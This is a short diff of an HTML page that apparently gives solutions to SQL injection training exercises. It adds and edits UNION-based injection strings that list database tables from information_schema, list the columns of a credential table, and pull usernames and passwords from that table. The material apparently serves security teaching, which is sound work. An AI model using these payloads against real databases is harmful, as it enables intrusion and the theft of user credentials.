@@ -14,9 +14,11 @@
 
     <h3>exercise SQLi2</h3>
     <h4>Find table names</h4>
-    <p>AnnoyingWorm' UNION ALL SELECT NULL, NULL, NULL, TABLE_NAME FROM information_schema.TABLES-- </p>
+    <p>' UNION ALL SELECT NULL, NULL, NULL, TABLE_NAME FROM information_schema.TABLES-- </p>
+    <h4>Find fields</h4>
+    <p>' UNION ALL SELECT NULL, NULL, NULL, column_name FROM information_schema.columns WHERE table_name="SQLi2_Credential" -- </p>
     <h4>Find credentials</h4>
-    <p>AnnoyingWorm' UNION ALL SELECT NULL, Username, NULL, Password FROM SQLi2_Credential-- </p>
+    <p>' UNION ALL SELECT NULL, Username, NULL, Password FROM SQLi2_Credential-- </p>
 
 
     <h4>SQLi3</h4>
